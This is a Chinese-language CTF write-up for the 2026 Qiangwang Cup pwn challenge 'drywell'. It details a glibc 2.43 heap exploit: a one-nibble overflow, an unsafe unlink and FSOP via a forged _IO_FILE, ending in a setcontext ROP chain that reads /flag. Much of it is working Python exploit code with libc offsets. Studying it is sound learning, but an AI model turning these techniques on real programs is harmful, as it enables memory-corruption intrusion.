# drywell（2026强网杯）

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 混合题（附件+靶机） |
| 附件 | drywell.zip内含pwn_drywell.tar.gz：chal、chal.c、libc.so.6、ld-linux-x86-64.so.2、Dockerfile、run.sh、flag.txt |
| 目标 | 容器 |

Flag：flag{动态容器已脱敏}

题面：The well is deep and the rope is short. A hardened note vault. Allocations live far above the tcache range, the bucket only comes up eight times, and every edit disturbs the geometry of whatever sits below.
题面已经把三个限制点说清楚了：分配大小远超tcache范围、`view`只能用8次、每次`edit`都会动到下方堆块的几何结构。

## 2. 题目分析

### 程序结构

```c
typedef struct {
  char *data;
  unsigned long len;
  unsigned long cap;
} Note;

static const unsigned long class_req[] = {0x4f8, 0x8f8, 0xff8};
#define MAX_NOTES 12
#define MAX_OPS 0x100
#define MAX_VIEWS 8
```

- `notes = calloc(12, sizeof(Note))`，ledger本身在堆上，地址`heap+0x10`；
- 命令：`add [class]`、`edit [idx] [len]`、`view [idx] [off]`、`free [idx]`、`quit`；
- `add`按class取`0x4f8/0x8f8/0xff8`，malloc后清零，放入第一个空槽；
- `edit`要求`len>0 && len<=cap`，`readn`读入后写`n->len`；
- `view`每次输出8字节的十六进制，全局只有8次；
- `free`释放后把`data/len/cap`清零，没有UAF。

ledger是`12*0x18=0x120`字节，`calloc`拿到`0x130`的块，`notes`落在`heap+0x10`，所以`notes[i]`的地址是`heap+0x10+0x18*i`，`notes[i].data`正好在`heap+0x10+0x18*i`处。这个固定步长是后面所有硬编码偏移的前提：改`notes[7].data`就等于改`T=heap+0x10+0x18*7`这一个8字节格子。

三类请求`0x4f8/0x8f8/0xff8`对应的chunk size是`0x500/0x900/0x1000`。tcache的上限是请求`0x410`，smallbin的上限是chunk`0x400`，三者全部越界，只能走largebin/unsorted路径——这正是题面“far above the tcache range”的含义：没有tcache这条最方便的复用链，任何复用都要靠unsorted切分或合并。

命令成本也要算清楚：`edit`一次要花掉“写入`len`字节+在`data[cap]`补一个字节”，`view`全局只有8次，`add/free`各占ops预算。整条链只用了2次`view`（全部用于泄漏），其余地址全靠对堆几何的确定性推算。

### 漏洞：edit末尾的越界一字节

```c
  if (readn(0, n->data, len) != len)
    goto err;
  n->len = len;

  /* account for the rope length; the knot is tied one notch below */
  n->data[n->cap] = (char)(((((len >> 4) ^ poison_key) & 0xe) << 4) |
                           (n->data[n->cap] & 0x0f));
```

`n->data[n->cap]`正好是下一个堆块`size`字段的最低字节。写入值只改高半字节：低4位保留原值，高4位由`((len>>4) ^ poison_key) & 0xe`决定，因此只能取`0x00/0x20/0x40/0x60/0x80/0xa0/0xc0/0xe0`这8个值，且必须知道`poison_key & 0xf`。

为什么越界点恰好是`size`字段：`data`指向用户区起始，`cap`就是该类的请求长度，而chunk的`size`字段位于用户区之后的第一个8字节；`data[cap]`落在`size`的最低字节上，`data[cap+1..cap+7]`仍属于`size`的高7字节。由于本程序从不做`realloc`、`free`时又要校验`size`，任何对`size`的破坏都必须“看起来合法”，所以只能改最低字节的高半字节：

- 低4位是标志位（`PREV_INUSE=1`、`IS_MMAPPED=2`、`NON_MAIN_ARENA=4`），程序原样保留，避免把`PREV_INUSE`清掉导致`free`误判前驱空闲；
- 高4位直接决定`size`的低字节，映射到`size&0xfff`的`0x?0`位置，可选项只有8个偶数半字节；
- `size`的高位字节不动，因此`0x500→0x5a0`、`0x500→0xb00`这类改动都是“只放大、不改归属”，`prev_size`与相邻块关系依旧自洽。

代价是`len`必须等于某个形如`minimum+((k^h)<<4)`的值，最大不超过`cap`（`len<=cap`的检查仍在），所以`k`必须已知，否则算出来的`len`会超出`cap`直接`err`，或者写出错误半字节把堆弄坏。

`poison_key`来自`/key`（`load_key`读8字节后只保留低4位），容器里`socat fork`共享同一个`/key`，所以一次探测出的key对整个实例有效。

### 要探测key的原因

脚本用两个辅助函数把“想要的size高半字节”换算成`len`：

```python
def clean_length(minimum, k):
    # ((len >> 4) ^ k) & 0xe == 0
    return minimum + ((k & 0xe) << 4)

def sized_length(minimum, k, high_nibble):
    # ((len >> 4) ^ k) & 0xe == high_nibble
    return minimum + (((k ^ high_nibble) & 0xe) << 4)
```

`clean_length`把目标size的低字节清成`0x?0`（高半字节为0），`sized_length`把它设成指定的偶数半字节（例如`0xa0`，即`0x500→0x5a0`）。探测采用“错key必然崩”的判定：

```python
for _ in range(3):
    t.add(0)
t.edit(0, b'Q' * clean_length(0x100, guess))
# If key is wrong, note1.size is increased while its forged next
# header is still all zeros; glibc aborts during free(1).
t.free(1)
```

`0..14`步长2枚举，`free(1)`不崩即命中。

步长取2是因为`(len>>4)&0xe`只用到bit1~bit3，`k`的bit0被`&0xe`丢掉，8个候选恰好覆盖全部可能。探测本身只花3次`add`、1次`edit`、1次`free`，且不消耗`view`；猜错时note1的`size`被改成非法值（下一块头部全零、`size=0`），`free(1)`在做consolidate校验时立刻abort，连接断开即“否定”。所以`check_key`把任何`EOF/RuntimeError`都当作“这个猜测不对”，整个探测是个二值判决，重复3次`add`只是为了让被改坏的块后面紧跟一个真实的块，保证错误一定暴露而不是被静默吞掉。

## 3. 解题过程

### 双泄漏：0xa0 remainder压住note2

```python
for _ in range(5):
    io.add(0)                                  # notes[0..4]
b = bytearray(clean_length(0x200, k))
put(b, 0x98, 0x21)                             # fake next.size
put(b, 0xb8, 0x21)                             # next-next.PREV_INUSE
io.edit(2, b)
io.edit(0, b'A' * sized_length(0x100, k, 0xa)) # note1: 0x500 -> 0x5a0
io.free(1)
io.add(0)                                     # split off 0xa0 in note2
io.free(3)                                    # unsorted fd/bk leak
libc_leak = io.view(2, 0)
heap_leak = io.view(2, 8)
libc = libc_leak - 0x212ac8
heap = heap_leak - 0x1030
```

先把note2里下一块的`size`与再下一块的`PREV_INUSE`伪造成`0x21`，再把note1的size从`0x500`拉到`0x5a0`；释放note1后再`add 0`，从这块里切出的`0xa0`余块正好落在note2的数据区内。随后释放note3进unsorted bin，其`fd/bk`正好落在note2可读范围内，一次`view(2,0)`同时拿到libc与堆地址（脚本各用一次view，共2次）。

这里的数字都是被结构钉死的，不是随手挑的：`0x5a0-0x500=0xa0`，即放大后的块被`add 0`（请求`0x4f8`、chunk`0x500`）切走后，尾部正好剩一个`0xa0`的free chunk；它的chunk头落在note1数据后`0x4f0`处，用户区落在note1+`0x500`，刚好等于note2数据区起点，于是这个“睡着”的余块与note2完全重叠。余块的chunk尺寸是`0xa0`，它的“下一块”头就必然在note2数据`+0x90`处，`size`字段在`+0x98`、再下一块的`PREV_INUSE`在`+0xb8`，所以`put(0x98,0x21)`/`put(0xb8,0x21)`这两个偏移固定；只要余块仍是`0xa0`，这两个位置就不会变。

`0x21`的选法也有讲究：`0x20`大小的块在`free`时不会和下方的note3合并，只做`PREV_INUSE`校验，正好把余块“封住”。而note2这次`edit`本身用的是`clean_length(0x200,k)`，长度不超过`0x2e0<0x4f8`，其末尾一字节写入把note2自己的`size`低字节高半字节清成0（低半字节原为`1`），既没破坏`PREV_INUSE`，也保证note2仍被当成`0x500`的已分配块。

### 前向合并：让note6覆盖7/8/9

```python
for _ in range(8):
    io.add(0)                            # fill notes[3,5..11]
fake = n7 + 0x90
b = bytearray(clean_length(0x200, k))
put(b, 0x98, 0xb01)
put(b, 0xa0, fake)
put(b, 0xa8, fake)
io.edit(7, b)
b = bytearray(clean_length(0x200, k))
put(b, 0x190, 0xb00)
put(b, 0x198, 0x20)
io.edit(9, b)
io.edit(5, b'A' * sized_length(0x100, k, 0xa))
io.free(6)
io.add(2)                                # note6 now overlaps 7,8,9
```

在note7里伪造一个“自链”的空闲块（`fake = n7+0x90`，`fd=bk=fake`，size`0xb01`），再把note9的`prev_size`写成`0xb00`、size写成`0x20`，把note5的size拉到`0x5a0`。释放note6时向前合并到`0x10a0`，再`add 2`（class 2，`0xff8`）复用刚空出的slot 6，新note6的数据区就覆盖了notes[7]/[8]/[9]。

`0x10a0`不是猜的：note6上方的实块尺寸被`edit(5)`改成了`0x5a0`，而note7里伪造的空闲块尺寸是`0xb00`，`0x5a0+0xb00=0x10a0`，这正是`free(6)`向前合并后落在unsorted里的块尺寸；随后的`add 2`请求`0xff8`，得到chunk`0x1000`，从`0x10a0`里切走正好再剩`0xa0`，和3.1是同一个余块技巧。`size`写成`0xb01`而不是`0xb00`，是因为`PREV_INUSE`必须保留；`prev_size`在note9头部写`0xb00`则用于让合并后的块自我一致。

这些偏移能硬编码，是因为每一步`add/free`的类顺序固定、所有类块都按`0x10`对齐且尺寸是0x10的整数倍，堆上不会插进额外碎片：note6的数据区一旦覆盖了notes[7..9]，note7、note8、note9的块头就落在note6数据区内固定的`0x500`间隔上，伪块的`size/fd/bk`三个槽位也就固定在`+0x8/+0x10/+0x18`这种8字节步长上。偏移只与“谁的块在谁的下面”有关，与ASLR、与具体libc补丁号都无关，所以能把它们写死。

### unsafe unlink：改掉ledger里的note7指针

```python
b = bytearray(sized_length(0xf00, k, 0xa))
put(b, 0x508, 0x4f1)       # fake prev chunk.size
put(b, 0x510, T - 0x18)    # fake fd; fd->bk at T
put(b, 0x518, T - 0x10)    # fake bk; bk->fd at T
put(b, 0x9f0, 0x4f0)       # note8.prev_size
put(b, 0x9f8, 0x500)       # note8.size (PREV_INUSE=0)
put(b, 0xef8, 0x501)      # restore note9.size
io.edit(6, b)
io.free(8)                # notes[7].data becomes T-0x18
```

`T`是ledger里note7的`data`字段（`T = notes + 7*0x18`）。伪造前驱块的`fd=T-0x18`、`bk=T-0x10`后，`free(8)`触发向后合并，safe-unlink的`fd->bk == bk->fd == T`检查恰好读到`notes[7].data`本身，于是通过；链表更新把`T`改写成`T-0x18`——note7的`data`从此指向ledger内部，后面就能用`edit 7`直接改写notes[6..11]的`{data,len,cap}`。

`T-0x18`/`T-0x10`这两个值是“让两个检查指针落到同一格”的唯一解：假块的`fd`字段在假块用户区`+0x0`，glibc检查时读`fd+0x18`处的`bk`，所以`fd=T-0x18`使`fd->bk`正好是`*T`；`bk`字段在`+0x8`，检查读`bk+0x10`处的`fd`，所以`bk=T-0x10`使`bk->fd`也正好是`*T`。两者相等不是因为把值写对了，而是因为两侧地址相同——这就是`T`指向ledger而不是指向某个堆地址的原因，也是safe-unlink在2.43上唯一能“零知识”通过的方式。至于`0x508`的`0x4f1`：假块`size=0x4f0`带`PREV_INUSE`，与note8头部写的`prev_size=0x4f0`配对，`chunksize(p)==prev_size(next)`才能过第一道检查；note8的`size=0x500`把`PREV_INUSE`清0，才能骗出合并路径；`0xef8`处补回`0x501`是因为note9的`size`此时已被上层布局改坏，不修复的话`free(8)`在检查note8与note9衔接时会先abort，根本走不到unlink。

### 伪造_IO_FILE与ORW链

三段伪造对象分别放在note9/note10/note11：

| 变量 | 位置 | 作用 |
| --- | --- | --- |
| `file_ptr` | `n9` | 假`_IO_FILE`，最终挂到`_IO_list_all` |
| `wide_data` | `n10` | 假`_IO_wide_data`，同时承载ORW链 |
| `fake_vtable` | `n11` | 假vtable，`+0x68`放`setcontext+0x2d` |

```python
vt = bytearray(clean_length(0x300, k))
put(vt, 0x68, libc + 0x4bead)   # setcontext+0x2d (rdx=FILE)
target_path = opts.flag_path.encode() + b'\0'
vt[0x100:0x100+len(target_path)] = target_path
io.edit(11, vt)
```

关键gadget与符号偏移（glibc 2.43）：

| 名称 | 偏移 |
| --- | --- |
| unsorted bin`fd`到libc基址 | 0x212ac8 |
| 堆泄漏到堆基址 | 0x1030 |
| `pop rsp; ret` | 0x3ca45 |
| `pop rdi; ret` | 0x11b9fa |
| `pop rsi; ret` | 0x11ccbb |
| `pop rbp; ret` | 0x2aafc |
| `pop rdx; leave; ret` | 0x9fead |
| `setcontext+0x2d` | 0x4bead |
| `openat` | 0x127a90 |
| `read` | 0x128150 |
| `write` | 0x128c10 |
| `_exit` | 0xf7180 |
| `_IO_wfile_jumps` | 0x211228 |
| `_IO_list_all` | 0x213480 |

`_IO_wide_data`的布置让`_IO_wfile_overflow`走到`_IO_wdoallocbuf`，再经`fp->_wide_data->_wide_vtable`（`wide_data+0xe0`）指向的假vtable跳到`setcontext`。脚本注释标注该入口为`setcontext+0x2d`，此时`rdx`指向假FILE；`fp+0xa0`指向`wide_data`、`fp+0xa8`放`pop rsp`，而`wide_data+0`放`wide_data+chain`，于是`pop rsp`把栈落到ORW链首。

这些偏移全部来自`_IO_FILE`/`_IO_wide_data`的公开布局，因此必然固定：`_flags`在`0x0`（`0xfbad8000`同时置上`_IO_USER_LOCK`，让`_IO_flush_all_lockp`不去真的加锁）、`_chain`在`0x68`（置0表示链表到此为止，不再顺着遍历）、`_lock`在`0x88`（指向note11里一块可写内存，避免对只读地址加锁崩掉）、`_wide_data`在`0xa0`、`_freeres_buf`在`0xa8`、`_mode`在`0xc0`（必须非0才能进入宽字符分支）、`vtable`在`0xd8`。`wide_data`一侧：`_IO_write_base/_IO_write_ptr/_IO_buf_base`分别在`0x18/0x20/0x30`，把`buf_base`留0、`write_ptr=buf_base+1`就能稳定触发`_IO_wdoallocbuf`；`_wide_vtable`在`0xe0`，所以假vtable里的`setcontext`必须落在`+0x68`（`_IO_wfile_jumps`中`__doallocate`的槽位）。

`0x1c0`处的`0x1f80`同理：`setcontext`会从`fp`的保存区恢复FPU状态，`MXCSR`必须是合法值，否则在真正pivot之前就收到`SIGFPE`。

```python
w = bytearray(clean_length(0x400, k))
chain, f1, f2, f3 = 0x100, 0x188, 0x248, 0x308
for i, x in enumerate([
    pop_rdi, (1 << 64) - 100, pop_rsi, path,
    pop_rbp, wide_data + f1, pop_rdx_leave, 0,
]):
    put(w, chain + 8 * i, x)
put(w, 0, wide_data + chain)    # pop rsp; ret -> ORW chain
put(w, 0x18, 0)                 # wide write_base
put(w, 0x20, 1)                 # wide write_ptr
put(w, 0x30, 0)                 # wide buf_base, force doallocate
put(w, 0xe0, fake_vtable)
# openat(AT_FDCWD, path, 0) returns fd 3.
for i, x in enumerate([
    0, libc + 0x127a90, pop_rdi, 3, pop_rsi, outbuf,
    pop_rbp, wide_data + f2, pop_rdx_leave, 0x100,
]):
    put(w, f1 + 8 * i, x)
```

三段链的语义：

1. `openat(AT_FDCWD, path, 0)`，返回fd 3；
2. `read(3, outbuf, 0x100)`；
3. `write(1, outbuf, 0x100)`后`_exit(1)`。

`pop_rdx_leave`把`rdx`设好后顺带`leave`，借`pop rbp`的值把栈切到下一段（`wide_data+f1/f2/f3`），这是2.43下没有干净`pop rdx; ret`时的常用替代。

`_IO_FILE`头本身的关键字段：

```python
f = bytearray(clean_length(0x300, k))
put(f, 0, 0xfbad8000)          # _IO_USER_LOCK
put(f, 0x68, 0)                # _chain = NULL
put(f, 0x88, n11 + 0x280)      # writable lock
put(f, 0xa0, wide_data)
put(f, 0xa8, pop_rsp)
put(f, 0xc0, 1)                # _mode = 1
put(f, 0xd8, libc + 0x211228)  # _IO_wfile_jumps
put(f, 0xe0, file_ptr + 0x200) # fp environment for setcontext
put(f, 0x1c0, 0x1f80)         # valid MXCSR
io.edit(9, f)
```

`0x1c0`处的`0x1f80`是合法MXCSR值，`setcontext`恢复浮点环境时不会因非法值崩掉。

### 改ledger并把假FILE挂上_IO_list_all

```python
a = bytearray()
for i in range(6, 12):
    addr = {
        6: heap + 0x2250,
        7: T - 0x18,
        8: libc + 0x213480,
        9: n9,
        10: n10,
        11: n11,
    }[i]
    cap = 0xff8 if i == 6 else 0x4f8
    a += p64(addr) + p64(0) + p64(cap)
io.edit(7, a)
io.edit(8, p64(file_ptr))       # _IO_list_all = fake FILE
```

由于note7的`data`已是`T-0x18`，这条`edit 7`实际写的是notes[6..11]的ledger项：note8的`data`被改成`libc+0x213480`（`_IO_list_all`），cap给`0x4f8`，于是下一条`edit 8`把`_IO_list_all`写成假FILE地址。

这段为什么能一次写穿整个ledger：`edit 7`的载荷长度是`6*0x18=0x90`，恰好覆盖`notes[6]..notes[11]`，而`edit`的`len<=cap`检查用的是`notes[7].cap`（仍为`0x4f8`），0x90远小于它，所以既不越界也不被拒。写入顺序上必须把note8的`data`放在这一批发改，因为下一次`edit 8`要靠新的指针才落到libc；note7自身要保留`T-0x18`（否则第二次就写不回ledger），note9/10/11继续指向各自的伪对象（后面不再编辑它们，但保持可读会让`view`响应与cap检查都正常）。`cap`统一给`0x4f8`而不是保留原值，是为了让后续任何一次`edit 8`的`len`都能取到`8`以上；note6保留`0xff8`只因为它还指向合并后的大块，理论上不再使用。

### 触发

```python
print('[+] FSOP ready; exiting to trigger setcontext + ORW', flush=True)
io.send(b'quit\n')
```

`quit`调用`exit(0)`，退出流程里的`_IO_flush_all_lockp`遍历`_IO_list_all`，命中假FILE，经`_IO_wfile_jumps`走到`setcontext`，pivot到ORW链，把`/flag`写回stdout。

触发条件完全是“结构驱动”：`_mode=1`让`flush_all`不走窄字符分支，`_IO_write_ptr=1 > _IO_write_base=0`让它必须调一次`_IO_OVERFLOW`，`vtable`换成`_IO_wfile_jumps`后这个调用进入宽字符overflow，`_wide_vtable->__doallocate`再跳到`setcontext`。ORW只用`openat/read/write/_exit`，因为seccomp放行的正是这几个号，`open`虽然也在白名单里但`openat`更省参数寄存器。

## 4. PoC

```python
c.edit(6, b); c.free(8)                     # fd->bk == bk->fd == T

# --- 4. 伪造 _IO_FILE / _IO_wide_data / ORW 链 ---
file_ptr, wide_data, fake_vtable = n9, n10, n11
path, outbuf = n11 + 0x100, n11 + 0x180
pop_rsp, pop_rdi, pop_rsi, pop_rbp = libc+0x3ca45, libc+0x11b9fa, libc+0x11ccbb, libc+0x2aafc
pop_rdx_leave = libc + 0x9fead

vt = bytearray(L(0x300))
vt[0x68:0x70] = p64(libc + 0x4bead)         # setcontext+0x2d, rdx = FILE
vt[0x100:0x105] = b'/flag\0'
c.edit(11, vt)

w = bytearray(L(0x400))
chain, f1, f2, f3 = 0x100, 0x188, 0x248, 0x308
w[0:8] = p64(wide_data + chain)             # pop rsp; ret 落点
w[0x18:0x20] = p64(0)                       # write_base
w[0x20:0x28] = p64(1)                       # write_ptr > write_base
w[0x30:0x38] = p64(0)                       # buf_base = 0, 强制 doallocate
w[0xe0:0xe8] = p64(fake_vtable)             # _wide_vtable
def wr(base, vals):
    for i, v in enumerate(vals): w[base+8*i:base+8*i+8] = p64(v)
wr(chain, [pop_rdi, (1 << 64) - 100, pop_rsi, path, pop_rbp, wide_data+f1, pop_rdx_leave, 0])
wr(f1, [0, libc+0x127a90, pop_rdi, 3, pop_rsi, outbuf, pop_rbp, wide_data+f2, pop_rdx_leave, 0x100])  # openat -> fd 3
wr(f2, [0, libc+0x128150, pop_rdi, 1, pop_rsi, outbuf, pop_rbp, wide_data+f3, pop_rdx_leave, 0x100])  # read(3,..)
wr(f3, [0, libc+0x128c10, libc+0xf7180])    # write(1,..); _exit(1)
c.edit(10, w)

f = bytearray(L(0x300))
for off, v in ((0, 0xfbad8000), (0x68, 0), (0x88, n11+0x280), (0xa0, wide_data),
               (0xa8, pop_rsp), (0xc0, 1), (0xd8, libc+0x211228),
               (0xe0, file_ptr+0x200), (0x1c0, 0x1f80)):
    f[off:off+8] = p64(v)                   # _IO_USER_LOCK/_chain/_lock/_mode/_IO_wfile_jumps
c.edit(9, f)

# --- 5. 写穿 ledger: note8 -> _IO_list_all, 再 quit 触发 ---
a = bytearray()
for i in range(6, 12):
    addr = (heap+0x2250, T-0x18, libc+0x213480, n9, n10, n11)[i-6]
    a += p64(addr) + p64(0) + p64(0xff8 if i == 6 else 0x4f8)
c.edit(7, a)                                # note8.data -> _IO_list_all
c.edit(8, p64(file_ptr))
c.io.send(b'quit\n')                        # exit -> flush_all -> setcontext -> ORW
print(c.io.recvall(timeout=3))

```
